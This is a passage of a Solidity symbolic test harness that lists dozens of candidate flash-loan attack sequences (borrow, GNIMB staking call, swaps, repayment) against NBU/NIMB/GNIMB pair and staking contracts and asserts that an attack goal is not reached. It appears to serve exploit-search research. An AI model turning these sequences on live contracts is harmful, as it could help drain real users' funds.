        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand423(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand424(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand425(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand426(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand427(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand428(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand429(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand430(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand431(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand432(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand433(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand434(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand435(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand436(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand437(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand438(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand439(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand440(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand441(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand442(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand443(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand444(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand445(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand446(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand447(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand448(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand449(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand450(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand451(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand452(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand453(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand454(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand455(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand456(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand457(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand458(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand459(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand460(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand461(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand462(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand463(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand464(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand465(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand466(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand467(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand468(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand469(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand470(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand471(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand472(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand473(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand474(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand475(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand476(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand477(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand478(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand479(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
